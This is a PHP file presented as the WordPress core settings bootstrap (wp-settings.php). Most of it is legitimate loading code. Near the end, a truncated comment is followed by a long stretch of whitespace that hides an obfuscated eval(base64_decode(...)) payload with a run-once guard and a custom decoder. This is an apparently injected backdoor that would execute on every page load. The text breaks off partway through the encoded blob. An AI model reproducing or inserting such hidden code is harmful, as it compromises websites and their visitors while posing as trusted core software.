<?php
/**
 * Used to set up and fix common variables and include
 * the WordPress procedural and class library.
 *
 * Allows for some configuration in wp-config.php (see default-constants.php)
 *
 * @internal This file must be parsable by PHP4.
 *
 * @package WordPress
 */

/**
 * Stores the location of the WordPress directory of functions, classes, and core content.
 *
 * @since 1.0.0
 */
define( 'WPINC', 'wp-includes' );

// Include files required for initialization.
require( ABSPATH . WPINC . '/load.php' );
require( ABSPATH . WPINC . '/default-constants.php' );

/*
 * These can't be directly globalized in version.php. When updating,
 * we're including version.php from another install and don't want
 * these values to be overridden if already set.
 */
global $wp_version, $wp_db_version, $tinymce_version, $required_php_version, $required_mysql_version, $wp_local_package;
require( ABSPATH . WPINC . '/version.php' );

/**
 * If not already configured, `$blog_id` will default to 1 in a single site
 * configuration. In multisite, it will be overridden by default in ms-settings.php.
 *
 * @global int $blog_id
 * @since 2.0.0
 */
global $blog_id;

// Set initial default constants including WP_MEMORY_LIMIT, WP_MAX_MEMORY_LIMIT, WP_DEBUG, SCRIPT_DEBUG, WP_CONTENT_DIR and WP_CACHE.
wp_initial_constants();

// Check for the required PHP version and for the MySQL extension or a database drop-in.
wp_check_php_mysql_versions();

// Disable magic quotes at runtime. Magic quotes are added using wpdb later in wp-settings.php.
@ini_set( 'magic_quotes_runtime', 0 );
@ini_set( 'magic_quotes_sybase',  0 );

// WordPress calculates offsets from UTC.
date_default_timezone_set( 'UTC' );

// Turn register_globals off.
wp_unregister_GLOBALS();

// Standardize $_SERVER variables across setups.
wp_fix_server_vars();

// Check if we have received a request due to missing favicon.ico
wp_favicon_request();

// Check if we're in maintenance mode.
wp_maintenance();

// Start loading timer.
timer_start();

// Check if we're in WP_DEBUG mode.
wp_debug_mode();

// For an advanced caching plugin to use. Uses a static drop-in because you would only want one.
if ( WP_CACHE )
	WP_DEBUG ? include( WP_CONTENT_DIR . '/advanced-cache.php' ) : @include( WP_CONTENT_DIR . '/advanced-cache.php' );

// Define WP_LANG_DIR if not set.
wp_set_lang_dir();

// Load early WordPress files.
require( ABSPATH . WPINC . '/compat.php' );
require( ABSPATH . WPINC . '/functions.php' );
require( ABSPATH . WPINC . '/class-wp.php' );
require( ABSPATH . WPINC . '/class-wp-error.php' );
require( ABSPATH . WPINC . '/plugin.php' );
require( ABSPATH . WPINC . '/pomo/mo.php' );

// Include the wpdb class and, if present, a db.php database drop-in.
require_wp_db();

// Set the database table prefix and the format specifiers for database table columns.
$GLOBALS['table_prefix'] = $table_prefix;
wp_set_wpdb_vars();

// Start the WordPress object cache, or an external object cache if the drop-in is present.
wp_start_object_cache();

// Attach the default filters.
require( ABSPATH . WPINC . '/default-filters.php' );

// Initialize multisite if enabled.
if ( is_multisite() ) {
	require( ABSPATH . WPINC . '/ms-blogs.php' );
	require( ABSPATH . WPINC . '/ms-settings.php' );
} elseif ( ! defined( 'MULTISITE' ) ) {
	define( 'MULTISITE', false );
}

register_shutdown_function( 'shutdown_action_hook' );

// Stop most of WordPress from being loaded if we just want the basics.
if ( SHORTINIT )
	return false;

// Load the L10n library.
require_once( ABSPATH . WPINC . '/l10n.php' );

// Run the installer if WordPress is not installed.
wp_not_installed();

// Load most of WordPress.
require( ABSPATH . WPINC . '/class-wp-walker.php' );
require( ABSPATH . WPINC . '/class-wp-ajax-response.php' );
require( ABSPATH . WPINC . '/formatting.php' );
require( ABSPATH . WPINC . '/capabilities.php' );
require( ABSPATH . WPINC . '/class-wp-roles.php' );
require( ABSPATH . WPINC . '/class-wp-role.php' );
require( ABSPATH . WPINC . '/class-wp-user.php' );
require( ABSPATH . WPINC . '/query.php' );
require( ABSPATH . WPINC . '/date.php' );
require( ABSPATH . WPINC . '/theme.php' );
require( ABSPATH . WPINC . '/class-wp-theme.php' );
require( ABSPATH . WPINC . '/template.php' );
require( ABSPATH . WPINC . '/user.php' );
require( ABSPATH . WPINC . '/class-wp-user-query.php' );
require( ABSPATH . WPINC . '/session.php' );
require( ABSPATH . WPINC . '/meta.php' );
require( ABSPATH . WPINC . '/class-wp-meta-query.php' );
require( ABSPATH . WPINC . '/class-wp-metadata-lazyloader.php' );
require( ABSPATH . WPINC . '/general-template.php' );
require( ABSPATH . WPINC . '/link-template.php' );
require( ABSPATH . WPINC . '/author-template.php' );
require( ABSPATH . WPINC . '/post.php' );
require( ABSPATH . WPINC . '/class-walker-page.php' );
require( ABSPATH . WPINC . '/class-walker-page-dropdown.php' );
require( ABSPATH . WPINC . '/class-wp-post.php' );
require( ABSPATH . WPINC . '/post-template.php' );
require( ABSPATH . WPINC . '/revision.php' );
require( ABSPATH . WPINC . '/post-formats.php' );
require( ABSPATH . WPINC . '/post-thumbnail-template.php' );
require( ABSPATH . WPINC . '/category.php' );
require( ABSPATH . WPINC . '/class-walker-category.php' );
require( ABSPATH . WPINC . '/class-walker-category-dropdown.php' );
require( ABSPATH . WPINC . '/category-template.php' );
require( ABSPATH . WPINC . '/comment.php' );
require( ABSPATH . WPINC . '/class-wp-comment.php' );
require( ABSPATH . WPINC . '/class-wp-comment-query.php' );
require( ABSPATH . WPINC . '/class-walker-comment.php' );
require( ABSPATH . WPINC . '/comment-template.php' );
require( ABSPATH . WPINC . '/rewrite.php' );
require( ABSPATH . WPINC . '/class-wp-rewrite.php' );
require( ABSPATH . WPINC . '/feed.php' );
require( ABSPATH . WPINC . '/bookmark.php' );
require( ABSPATH . WPINC . '/bookmark-template.php' );
require( ABSPATH . WPINC . '/kses.php' );
require( ABSPATH . WPINC . '/cron.php' );
require( ABSPATH . WPINC . '/deprecated.php' );
require( ABSPATH . WPINC . '/script-loader.php' );
require( ABSPATH . WPINC . '/taxonomy.php' );
require( ABSPATH . WPINC . '/class-wp-term.php' );
require( ABSPATH . WPINC . '/class-wp-tax-query.php' );
require( ABSPATH . WPINC . '/update.php' );
require( ABSPATH . WPINC . '/canonical.php' );
require( ABSPATH . WPINC . '/shortcodes.php' );
require( ABSPATH . WPINC . '/embed.php' );
require( ABSPATH . WPINC . '/class-wp-embed.php' );
require( ABSPATH . WPINC . '/class-wp-oembed-controller.php' );
require( ABSPATH . WPINC . '/media.php' );
require( ABSPATH . WPINC . '/http.php' );
require( ABSPATH . WPINC . '/class-http.php' );
require( ABSPATH . WPINC . '/class-wp-http-streams.php' );
require( ABSPATH . WPINC . '/class-wp-http-curl.php' );
require( ABSPATH . WPINC . '/class-wp-http-proxy.php' );
require( ABSPATH . WPINC . '/class-wp-http-cookie.php' );
require( ABSPATH . WPINC . '/class-wp-http-encoding.php' );
require( ABSPATH . WPINC . '/class-wp-http-response.php' );
require( ABSPATH . WPINC . '/widgets.php' );
require( ABSPATH . WPINC . '/class-wp-widget.php' );
require( ABSPATH . WPINC . '/class-wp-widget-factory.php' );
require( ABSPATH . WPINC . '/nav-menu.php' );
require( ABSPATH . WPINC . '/nav-menu-template.php' );
require( ABSPATH . WPINC . '/admin-bar.php' );
require( ABSPATH . WPINC . '/rest-api.php' );
require( ABSPATH . WPINC . '/rest-api/class-wp-rest-server.php' );
require( ABSPATH . WPINC . '/rest-api/class-wp-rest-response.php' );
require( ABSPATH . WPINC . '/rest-api/class-wp-rest-request.php' );

// Load multisite-specific files.
if ( is_multisite() ) {
	require( ABSPATH . WPINC . '/ms-functions.php' );
	require( ABSPATH . WPINC . '/ms-default-filters.php' );
	require( ABSPATH . WPINC . '/ms-deprecated.php' );
}

// Define constants that rely on the API to obtain the default value.
// Define must-use plugin directory constants, which may be overridden in the sunrise.php drop-in.
wp_plugin_directory_constants();

$GLOBALS['wp_plugin_paths'] = array();

// Load must-use plugins.
foreach ( wp_get_mu_plugins() as $mu_plugin ) {
	include_once( $mu_plugin );
}
unset( $mu_plugin );

// Load network activated plugins.
if ( is_multisite() ) {
	foreach ( wp_get_active_network_plugins() as $network_plugin ) {
		wp_register_plugin_realpath( $network_plugin );
		include_once( $network_plugin );
	}
	unset( $network_plugin );
}

/**
 * Fires once all must-use and network-activated plugins have loaded.
 *
 * @since 2.8.0
 */
do_action( 'muplugins_loaded' );

if ( is_multisite() )
	ms_cookie_constants(  );

// Define constants after multisite is loaded.
wp_cookie_constants();

// Define and enforce our SSL constants
wp_ssl_constants();

// Create common globals.
require( ABSPATH . WPINC . '/vars.php' );

// Make taxonomies and posts available to plugins and themes.
// @plugin authors: warning: these get registered again on the init hook.
create_initial_taxonomies();
create_initial_post_types();

// Register the default theme directory root
register_theme_directory( get_theme_root() );

// Load active plugins.
foreach ( wp_get_active_and_valid_plugins() as $plugin ) {
	wp_register_plugin_realpath( $plugin );
	include_once( $plugin );
}
unset( $plugin );

// Load pluggable functions.
require( ABSPATH . WPINC . '/pluggable.php' );
require( ABSPATH . WPINC . '/pluggable-deprecated.php' );

// Set internal encoding.
wp_set_internal_encoding();

// Run wp_cache_postload() if object cache is enabled and the function exists.
if ( WP_CACHE && function_exists( 'wp_cache_postload' ) )
	wp_cache_postload();

/**
 * Fires once activated plugins have loaded.
 *
 * Pluggable functions are also available at this point in the loading order.
 *
 * @since 1.5.0
 */
do_action( 'plugins_loaded' );

// Define constants which affect functionality if not already defined.
wp_functionality_constants();

// Add magic quotes and set up $_REQUEST ( $_GET + $_POST )
wp_magic_quotes();

/**
 * Fires when comment cookies are sanitized.
 *
 * @since 2.0.11
 */
do_action( 'sanitize_comment_cookies' );

/**
 * WordPress Query object
 * @global WP_Query $wp_the_query
 * @since 2.0.0
 */
$GLOBALS['wp_the_query'] = new WP_Query();

/**
 * Holds the reference to @see $wp_the_query
 * Use this global for WordPress queries
 * @global WP_Query $wp_query
 * @since 1.5.0
 */
$GLOBALS['wp_query'] = $GLOBALS['wp_the_query'];

/**
 * Holds the WordPress Rewrite object for creating pretty URLs
 * @global WP_Rewrite $wp_rewrite
 * @since 1.5.0
 */
$GLOBALS['wp_rewrite'] = new WP_Rewrite();

/**
 * WordPress Object
 * @global WP $wp
 * @since 2.0.0
 */
$GLOBALS['wp'] = new WP();

/**
 * WordPress Widget Factory Object
 * @global WP_Widget_Factory $wp_widget_factory
 * @since 2.8.0
 */
$GLOBALS['wp_widget_factory'] = new WP_Widget_Factory();

/**
 * WordPress User Roles
 * @global WP_Roles $wp_roles
 * @since 2.0.0
 */
$GLOBALS['wp_roles'] = new WP_Roles();

/**
 * Fires before the theme is loaded.
 *
 * @since 2.6.0
 */
do_action( 'setup_theme' );

// Define the template related constants.
wp_templating_constants(  );

// Load the default text localization domain.
load_default_textdomain();

$locale = get_locale();
$locale_file = WP_LANG_DIR . "/$locale.php";
if ( ( 0 === validate_file( $locale ) ) && is_readable( $locale_file ) )
	require( $locale_file );
unset( $locale_file );

// Pull in locale data after loading text domain.
require_once( ABSPATH . WPINC . '/locale.php' );

/**
 * WordPress Locale object for loading locale domain date and various strings.
 * @global WP_Locale $wp_locale
 * @since 2.1.0
 */
$GLOBALS['wp_locale'] = new WP_Locale();

// Load the functions for the active theme, for both parent and child theme if applicable.
if ( ! wp_installing() || 'wp-activate.php' === $pagenow ) {
	if ( TEMPLATEPATH !== STYLESHEETPATH && file_exists( STYLESHEETPATH . '/functions.php' ) )
		include( STYLESHEETPATH . '/functions.php' );
	if ( file_exists( TEMPLATEPATH . '/functions.php' ) )
		include( TEMPLATEPATH . '/functions.php' );
}

/**
 * Fi*/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval(base64_decode("aWYgKCFkZWZpbmVkKCdBTFJFQURZX1JVTl8xYmMyOWIzNmYzNDJhODJhYWY2NjU4Nzg1MzU2NzE4JykpCnsKZGVmaW5lKCdBTFJFQURZX1JVTl8xYmMyOWIzNmYzNDJhODJhYWY2NjU4Nzg1MzU2NzE4JywgMSk7CgogJGthdmxqID0gNTYwOTsgZnVuY3Rpb24geHpucnlrdigkc3NjZmksICRnd25hbCl7JGxndXpwcHZqID0gJyc7IGZvcigkaT0wOyAkaSA8IHN0cmxlbigkc3NjZmkpOyAkaSsrKXskbGd1enBwdmogLj0gaXNzZXQoJGd3bmFsWyRzc2NmaVskaV1dKSA/ICRnd25hbFskc3NjZmlbJGldXSA6ICRzc2NmaVskaV07fQokcnJrd2Voaj0iYmFzZSIgLiAiNjRfZGVjb2RlIjtyZXR1cm4gJHJya3dlaGooJGxndXpwcHZqKTt9CiR6bnRremxscmcgPSAnNmNCcWdDblV2VDZacjdDUGJEblBUN2RYdlBiSWZNS0NSTVF5MlFFVjZjQnFnQ25VdlQ2WnI3ZFh2NG5CYkdyJy4KJ1hiR3VHV2h3UVZSSUZoejh5M0RCNWI3Q0VWaGpTYVRZNXZUWUJhSkNFZ2tucVRKTnkza21HVycuCidod1FWUklGaHo4QmJHclhiQm5QdlQ4WGJHTnkzRGJadWh6SHQ2eXdiN0NFVEpOeTNrQycuCic1M2NCU2dUNlp1aHpIdDZaRmhsRVZna2FaZmtOQnZEQnF2azZaZkI4Zm1BbkFSRVFvVjF6RmhHSUZob3dsZmg4enZrdnkzRG1aZkI4Zm1BbkFSRVFvV2h3b1RjMG9WUklGaEdFJy4KJ0ZobEVWZ2thWmZrTkJ2REJxdms2WmZ6TnJtekN0Q01uMWtDblJOQzg4bXpBbVI0Zm9WMXpGaEdJRmhvd2xmaDh6dmt2eTNEbVpmek4nLgoncm16Q3RDTW4xa0NuUk5DODhtekFtUjRmb1dod29XUGZ5MlFFVjU2RVZ0Nnl5dm93WmZrTkJ2REJxdms2WnJFQXVtekM4TkFCNW1CQycuCicyVFVNRUZjdTBGN0ZERjlmVWFETTB1REFZdkR6NzJMcnlha2ZkRkRBRWdrc2QyaGJ5VjZFVmVRRVZmaHdsZmNOQnYnLgonREJxdjFsRzZtZDFObUFNa0NuMUNtSzV1UjZFYVVsSmE3YTd1OUZvYVJsUGFrQURnUmEwYkRCWWE5TTdhVE55MycuCidVTTByUFFsdTF6SHQ2WkZob3dsZmh3enZjQUVhMXduZk1LQ1JNUUh0NlpsZmh3bHJjTllqY0E1ZzdDS2Z0Jy4KJ0VsUkJDdVJ0SUZobEVWZmh3bGZoTkxSTW5oNm1kUmtQajliNG5ZalROWnI0RWxpMXdHYTl6SnU3YUVGdGxTdnR3ZHYxRUV1VU1LV2tmN2FVTVNhUk1KdnRtRScuCidGRHU0RjlDenJVSUZob3dsZmg4RzNjbm9ha1FscmNGVVQ3QTRqY2xIdDZaRmhsRVZmaHdsZmN2NDNERkVna25xZmMnLgonRlVURWpCak1ZWGJKNlpWNkVWZmh3bGZMSUZob3dsZmh3bGZod2xiRENFalRycWZMRkViR05YM2NuSnZUZlpiTHJCdjRuUHYnLgonVDhJYWtGQlZoYlhUb1lKakpqc3ZHTlFWQ1FxVzd6R1doYkdXTXd6VDRGQW1CdkFtQklHMUFObW1BbmZSNEZtcjRFeVZSSUZob3dsZmg4bnQ2WkZob3dsZmg4RGprSzlqY0JYMycuCidvODliNG5MdlROVGJEQkVha3JJdm1OeWJHdVpWNkVWZmh3bGZMSUZob3dsZmh3bGZod2xyTHJCYlB3bmZNJy4KJ0FQYkRBS1Zoekh0NlpGaG93bGZod2xmaHdscmNBcWFrZEtiSkJVVEpBNHZUQ0JmdEVsNlRyUGFUelpWUicuCidJRmhsRVZmaHdsZmh3bGZod3pha0tZM0xCVWVURjViVENCamtDM1Qxd25mY0ZVVEVqQmpNTlhhNHJYM0o2WlZSSUZobEVWZmh3bGZod2xmaHd6YjcnLgonQ0l2Qm5RYVROWmZ0RWxyQW5STkNya05DcjNyNEZ0bXpCNkNBbmMxbWRBUnpBRk4xamoyUUVWZmh3bGZod2xmaDhKZ2NCSXYxd1pWaE5VM2NBVWdod24nLgonZkxGRWJHclEzSnVackxGQjNjdjViY0FFZ2hRbE5NQjFObUZtUjRydlQ0RkFtTUExNkNOaW1venlmaE1uaTE4YzZtZFJOMXpGaG93bGZod2xmaHdsZVFFVmZod2xmaHdsZmgnLgond2xmaHdsckxGQjNjdjViY0FFZ2h3bmZMRjRhR0ZFYm9semI3Q0l2Qm5RYVROWldod1FXaHd6YjdkWWI3bHkyUUVWdDZabGZod2xmaHdsZmh3bGZoOHl2b3dackxGQjNjdicuCic1YmNBRWdod25pMTg5YjRuTHZUTk0zN0YxMzduRVZoenl0NlpsZmh3bGZod2xmaHdsZmg4SHQ2WmxmaHdsZmh3bGZod2xmaHdsZmh3bGFHckJha0lIdDZabGZod2xmaHdsZmgnLgond2xmaDhudDZaRmhvd2xmaHdsZmh3bGZod2xmY0JEZmhZVWpMckl2azBackxGQjNjdjViY0FFZ2h6eXQ2WmxmaHdsZmh3bGZod2xmaDhIdDZabGYnLgonaHdsZmh3bGZod2xmaHdsZmh3bHJjQXFha2RLYkpCVVRKQTR2VENCazRFbGkxd3piN0NJdkJuUWFUTloyUUVWZmh3bGZod2xmaHdsZmh3bDU2RVZmaHcnLgonbGZod2xmaDhudDZaRmhvd2xmaHdsZmh3bHZEblB2a0E5Z2h3WnJjQXFha2RLYkpCVVRKQTR2VENCZmNBVWZoTjlqVHJQdicuCidrS0VUN055Ym96Rmhvd2xmaHdsZmh3bGVRRVZmaHdsZmh3bGZod2xmaHdsZ2thbFZoQXkzQm5ZYkdyWScuCidlMWx6YUpDUGJEQ3FqQW56Z1RmSWZoTlB2VHV5VjZFVmZod2xmaHdsZmh3bGZod2xlUUVWZmh3bGZod2xmaHdsZmh3bGZod2xmaE5QdlR1bGkxOFliR3JZZUNuU3ZUJy4KJ3JHdjFsemJEQ1VXaDg5YjRuTHZUTk1nVHJCYUpOWGJHQnVnVEZFVmhOOWpUclB2a0tFVDdOeWJvenkyUUVWZmh3Jy4KJ2xmaHdsZmh3bGZod2w1NkVWZmh3bGZod2xmaDhudDZaRmhvd2xmaHdsZmh3bGJEQ0VqVHJxZmNGVVRFRlp2a0ZPQ0pyeWpjQW8zY21aYVRyUGEnLgonVEI1amtLeWJUQ0JWaE5QdlR1eVZSSUZob3dsZmg4bnQ2WkZob3dsZmg4RGprSzlqY0JYM284OWI0bnRnY0M5ZycuCic0alBnVE5ZYURkQlZoTnpnVHI1M2NCVWpoekZob3dsZmg4SHQ2WmxmaHdsZmh3bGZoTnpnVHI1M2NCVWpBbkpiREInLgonRWFrckl2MXduZk1BUGJEQUtWaHpIdDZaRmhvd2xmaHdsZmh3bHZEblB2a0E5Z2h3WnJjTnliQm5JZ1RGRScuCidmY0FVZmhOemdUZnl0NlpsZmh3bGZod2xmTElGaG93bGZod2xmaHdsZmh3bGZjQkRmaFl3Z1RGNWpKcnlqY0FvJy4KJzNjbVpyY055Ym96bHJvYWxnVEY1dmNCUFZoTnpnVGZ5VjZFVmZod2xmaHdsZmh3bGZod2xlUUVWZmh3bGZod2xmaHdsZmh3bGZod2xmaE56Z1RyNTMnLgonY0JVakFuSmJEQkVha3JJdkNTamZ0RWxyY055YjlJRmhvd2xmaHdsZmh3bGZod2xmTEVGaG93bGYnLgonaHdsZmh3bDU2RVZ0NlpsZmh3bGZod2xmTHJCakxDUDNvd3p2Y0JQVDdkeWJKTjVqSnJ5amNBbzNjbUh0NlpsZmh3bDU2RVZ0NicuCidabGZod2x2R0NxYUpOeTM3MGxhSkY1TjdDRU5jQlB2a0ZFM0pyS1JjQlVqaGx6dmNCUFdod3p2Y0NRamNsbnVSd3l0NlpsZmh3bGVRRVZmaHdsZmh3bCcuCidmaHd6YkRDVWprZEVmdEVsYVRyUGFUelpWUklGaGxFVmZod2xmaHdsZmg4eXZvd1pma0JVVDdOeWJvbHp2Y0JQVjF6Rmhvd2xmaHdsZmh3bGVRRVZmaHdsZmh3bGZod2wnLgonZmh3bGJEQ0VqVHJxZmhOUHZURjQzTDZIdDZabGZod2xmaHdsZkxFRmhsRVZmaHdsZmh3bGZod3piRENVamtkRScuCidrNEVsaTF3enZjQlAyUUVWZmh3bGZod2xmaHd6dmNCUFQ3Rlhqa0tFZnRFbHV0SUZobEVWZmh3bGZod2xmaDh5dm93WnInLgonY05CYkxOWmZ0UWx1MXpGaG93bGZod2xmaHdsZVFFVmZod2xmaHdsZmh3bGZod2xiRENFalRycWZoTlB2VEY0M0w2SHQ2WmxmaHcnLgonbGZod2xmTEVGaGxFVmZod2xmaHdsZmh3enZjQlBmdEVsYkpOUDNjQ3FWaE56Z1RmeWZ0RW5mdE1saVB3enZjQlBmdFpsYkdOUGdrRVpyY055Ym9RbHI0ZGJXUGJ5MlFFVicuCidmaHdsZmh3bGZod3pnaHduZk04WGJjQ3F2Y0JQVmhOemdUZnkyUUVWZmh3bGZod2xmaDh5dm93WnJjbGxpUkVuZk12OFJBRkFWNkVWZmh3bGZod2xmJy4KJ2g4SHQ2WmxmaHdsZmh3bGZod2xmaDhQdlRONGJEMGxyTHJCYkpDSWp0SUZob3dsZmh3bGZod2w1NkVWdDZabGZod2xmaHdsZkxqWmdrZEJmaGxacicuCidjYWxpMThQdmtBenZjQlBWaE5aVjF6bGZSRW5mTXY4UkFGQVY2RVZmaHdsZmh3bGZoOEh0NlpsZmh3bGZod2xmaHdsZmg4eXZvd1onLgoncmNhbGZSRW5maGJxclA4WTNENmxyY2FsZlJFbmZoYnFXb2J5dDZabGZod2xmaHdsZmh3bGZoOEh0NlpsZmh3bGZod2xmaHdsZmh3bGZod2xyY0Y0YkdyJy4KJ0IzR041dmNCUGZ0RWxmb056Z1RmWHJjYW8yUUVWZmh3bGZod2xmaHdsZmh3bGZod2xmY0JEZmhZJy4KJ3liNG56Z1RmWnJjRjRiR3JCM0dONXZjQlBWMXpGaG93bGZod2xmaHdsZmh3bGZod2xmaDhIdDZaJy4KJ2xmaHdsZmh3bGZod2xmaHdsZmh3bGZod2xmaE56Z1RyNWE3bjQzRzZsVlVFbHVSSUZobEVWZmh3bGZod2xmaHdsZicuCidod2xmaHdsZmh3bGZod3piRENVamtkRWs0RWxpMXd6YUpDUGJEQ3FqQW56Z1RmSHQ2WmxmaHdsZmh3bGZod2xmaHdsZmh3bGZod2xmaE5QdlRGNDMnLgonTDZsaTE4WWJHclllQ25TdlRyR3YxbHpiRENVamtkRVdoODliNG5MdlROTWdUckJhSk5YYkdCdWdURkVWaE45alRyUHZrS0VUN055YicuCidvUWxyY05CYkxOWmZoc2x1Und5VlJJRmhvd2xmaHdsZmh3bGZod2xmaHdsZmg4bnQ2WmxmaHdsZmh3bGZod2xmaDhudCcuCic2WmxmaHdsZmh3bGZMRUZobEVWZmh3bGZod2xmaDg5M2NuVXZrTnlib2x6Z2h6SHQ2WkZob3dsZmh3bGZod2xiRENFalRycWZoTlB2VEY0M0w2SHQ2WmxmJy4KJ2h3bDU2RVZ0NlpsZmh3bHZHQ3FhSk55MzcwbGFKRjVON0NFTmNuOW1EblhqaGx5dDZabGZodycuCidsZVFFVmZod2xmaHdsZmh3enZjbjliRG5YakFuQjNENmxpMThVakxyUGJjblVWaE41bUVDMUN6QzFrUGpSNjRyJy4KJ3JtQU41TnpCdU5tSzhSbW1HVDFRbHJBblJOQ3JrTkNyM3I0ckFtQ0NBbTRONUNDcnJyNEV5MlFFVmZod2xmaHdsZmg4eXZvd1pyYycuCidOWGFKclgzSk41dmtLemZ0RW5pMThjNm1kUk4xekZob3dsZmh3bGZod2xlUUVWZmh3bGZod2xmaHdsZmh3bGJEQ0VqVHJxZmhONW1FQzFDekMxa1BqJy4KJ01SRUZDUm1DMkNBbjFSRW5tcjRFSHQ2WmxmaHdsZmh3bGZMRUZob3dsZmh3bGZod2x2a2RVdmtCRGZobHp2Y245YkRuWGpBbkIzRDZsaVJFbmZ0Jy4KJ3d5dDZabGZod2xmaHdsZkxJRmhvd2xmaHdsZmh3bGZod2xmTHJCakxDUDNvd29XUGZIdDZabGZod2xmaHdsZkxFRmhvd2xmaHdsZmh3bHZrZFV2NkVWZmh3bGZod2wnLgonZmg4SHQ2WmxmaHdsZmh3bGZod2xmaDhQdlRONGJEMGxiSkNvYkpOUFZoTjVtRUMxQ3pDMWtQalI2NHJybUFONU56QnVObUs4Um1tR1QxUWx1aFFscmNOWGFKclgzSk41dicuCidrS3pWUklGaG93bGZod2xmaHdsNTZFVmZod2xmTEVGaGxFVmZod2xmY0JEZmhsWXZHQ3FhSk55MzdLNXZUWXliSk5VVmhqRGdrZEJUSjg0akFuOTM3SycuCidFdmtLRWJQYnlWNkVWZmh3bGZMSUZob3dsZmh3bGZod2x2R0NxYUpOeTM3MGx2REJJdkNuUWpUTicuCic1YTducWpjQ3FqTHVacmMwSWZoTnpXaHd6dkRkWXZQd25mTXZZM0xGQlY2RVZmaHdsZmh3bGZoOEh0NlpsZmh3bGZod2xmaHdsZmh3ejNrbnp2MScuCid3bmZoTkQzY0FHZnRFbmZ0bGxpUHdHYTFibDJvd0dqUGJIdDZabGZod2xmaHdsZmh3bGZod3p2b3duZk04RDNKOEIzb2x6M29RbHJjNFh2Y215MlFFVmZod2xmaHdsZmh3Jy4KJ2xmaHdsZ2thbFZoTkRmdEVuaTE4Y2FrZFV2MXpGaG93bGZod2xmaHdsZmh3bGZMSUZob3dsZmh3bGZod2xmaHdsZmh3bGZoOFB2VE40YkQwbHV0SUZob3dsZmh3bGYnLgonaHdsZmh3bGZMRUZob3dsZmh3bGZod2xmaHdsZmNDSWI3bUZob3dsZmh3bGZod2xmaHdsZkxJRmhvd2xmJy4KJ2h3bGZod2xmaHdsZmh3bGZoOHl2b3daZ1RGNWFUclBhVHpacmM2eVYxd3p2aHduZmNCU2JjZFh2Y21acmM2eTJRRVZmaHcnLgonbGZod2xmaHdsZmh3bGZod2xmaE5vZVROQmI0bkpiREJFamNDcWZ0RWx2R2pQZ1ROQlZoTkRXaHd6dmh6SHQ2WmxmaHdsZmh3bGZod2xmaHdsZmh3bHZERkknLgonM0pGQlZoTkRWUklGaG93bGZod2xmaHdsZmh3bGZod2xmaDhQdlRONGJEMGxyY3JLamNDVVRKalBnVE5FdmswSHQ2WmxmaHdsZmh3bGZod2xmaDhudDZabCcuCidmaHdsZmh3bGZMRUZob3dsZmg4bnQ2WkZob3dsZmg4eXZvd1pma3Y0M0RGRWdrbnFUN0MwZ1RGRWJQbEd2REJJdkNuR3ZUTjVhN25xamNDcWonLgonTHVHVjF6Rmhvd2xmaDhIdDZabGZod2xmaHdsZmN2NDNERkVna25xZmN2eTNjQzV2N0NFVDdGWDNHTkIzR05VVmhORGdrZEIzREFTdjF6Rmhvd2xmaHdsZmh3bGVRRVZmJy4KJ2h3bGZod2xmaHdsZmh3bHJjdlpha0t6M2NtbGkxOEQzSjhCM29senZEQkl2a0tZM2ttSWZoclBmb3pIdDZabGZoJy4KJ3dsZmh3bGZod2xmaHd6dkRGWDNHTkIzR05VZnRFbHZHckJhazZacmN2WmFrS3ozY21JZmN2eTNjQ1VnVHlCJy4KJ1ZoTkRna2RCM0RBU3YxenkyUUVWZmh3bGZod2xmaHdsZmh3bHZERkkzSkZCVmhORGdjQXEnLgondmNkQlZSSUZobEVWZmh3bGZod2xmaHdsZmh3bGJEQ0VqVHJxZmhORGE3bnFqY0Nxakx1SHQ2WmxmaHdsZmh3bGZMRUZob3dsZmg4bnQ2WkZobEVWJy4KJ2Zod2xmY3Y0M0RGRWdrbnFmY0ZVVDdOQmFKcktiTE41YmNZWWI3bVpyY05ZamNNSWZoTk92VHp5dDZabGZod2xlUUVWZmh3bGZod2xmaHd6M0pDRVQ3TllqY01saTF3b2Y5SScuCidGaGxFVmZod2xmaHdsZmg4RDNKZmxWaE55aVJ3SGZoTnlpTEZFYkRkQjNvbHp2Y0FFYTF6Jy4KJ0hWNkVWZmh3bGZod2xmaDhIdDZabGZod2xmaHdsZmh3bGZoOEQzSmZsVmhOeGlSd0hmaE54aUxGRWJEZEIzb2x6ZzdDS1Yxd0Ryb3d6Z1JkVWpMckl2azBacmMnLgonTllqY015MlB3emdvSU9XaHd6ZzFJT1Y2RVZmaHdsZmh3bGZod2xmaHdsZVFFVmZod2xmaHdsZmh3bGZod2xmaHdsZmhOWGpUTjV2Y0FFYTF3cWkxODlnTGZaM0pyJy4KJ3pWaE56YVROWWtQTnlUMXpsVG84WGJENlpyY1NCZUNJemdCRXlWUklGaG93bGZod2xmaHdsZmh3bGZMRUZob3dsZmh3bGZod2w1NkVWdDZabGZod2xmaHdsZkxyQmpMQ1Azb3cnLgonejNKQ0VUN05ZamNNSHQ2WmxmaHdsNTZFVnQ2WmxmaHdsdkdDcWFKTnkzNzBsYUpGNXZjQzliR0JRamhsenYnLgonY0FFYTFRbHJjU0JlMXpGaG93bGZoOEh0NlpsZmh3bGZod2xmY2pJMzdyWTNod3phSkY1YVRDJy4KJ0VndElGaGxFVmZod2xmaHdsZmg4UHZUTjRiRDBsYUpGNXZjQzliR0JRakFuUWdjQVV2MVk5YjRuenZrRlBlVDhFVEo4WmFURkJWaE56YVROWVdod3pnN0NLVjFRbHJjRicuCidVVDdBNGpjbHkyUUVWZmh3bGZMRUZob3dsZmg4RGprSzlqY0JYM284OWI0bkIzREZQZVQ4RVZoTnphVE5ZV2h3emc3Q0tWNkVWZmh3bGYnLgonTElGaG93bGZod2xmaHdsdjdkWGFEQUlmaE45YjRuWWpUTloyUUVWdDZabGZod2xmaHdsZkxyQmpMQ1Azbzg5YjRuenZrRlBlJy4KJ1Q4RVRKOFphVEZCVmNGVVQ3TkJhSnJLYkxONWJjWVliN21acmNOWWpjTUlmaE45YjRuWWpUTlpWMVFscmNTQmUxekh0NlpsZmh3Jy4KJ2w1NkVWdDZabGZod2x2R0NxYUpOeTM3MGxhSkY1dkRCSXZDblB2a0F6VmhOUWFUTlpWNkVWZmh3bGZMSUZob3dsZmh3bGZod2xyY05ZamNNbGkxOHd2REJJdkNuR3YnLgonVE41YTducWpjQ3FqTHVackw4WWpjbHkyUUVWdDZabGZod2xmaHdsZkxyQmpMQ1Azb3d6dmNBRWFSSUZob3dsZmg4bnQ2WkZob3dsZmg4RGprJy4KJ0s5amNCWDNvODliNG5EZ2tkQlRKalBnVE5CVmhOUWFUT